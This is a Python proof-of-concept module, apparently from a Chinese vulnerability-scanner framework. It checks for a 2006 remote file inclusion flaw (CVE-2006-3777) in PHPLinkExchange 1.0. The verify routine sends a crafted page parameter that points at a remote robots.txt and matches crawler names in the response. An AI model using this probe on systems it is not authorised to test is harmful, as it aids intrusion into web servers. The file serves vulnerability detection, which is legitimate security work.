# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re

class Vuln(ABVuln):
    poc_id = '028c8d57-0606-46fa-9aad-939519680c1b'
    name = 'IDevSpot PHPLinkExchange 1.0 Index.PHP Remote File Include Vulnerability' # 漏洞名称
    level = VulnLevel.MED # 漏洞危害级别
    type = VulnType.RFI # 漏洞类型
    disclosure_date = '2006-07-24'  # 漏洞公布时间
    desc = '''
        IDevSpot PHPLinkExchange 1.0 Index.PHP文件存在远程文件包含漏洞。
    ''' # 漏洞描述
    ref = 'https://www.seebug.org/vuldb/ssvid-81821' # 
    cnvd_id = 'CNVD-2006-5629' # cnvd漏洞编号
    cve_id = 'CVE-2006-3777'  # cve编号
    product = 'IDevSpot PHPLinkExchange'  # 漏洞组件名称
    product_version = '1.0'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'b7b2470f-2259-4b71-a382-148019958189' # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            vul_url = arg + '/index.php?page=http://baidu.com/robots.txt'
            response = requests.get(vul_url).content
            if 'Baiduspider' in response or 'Googlebot' in response:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
            
        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()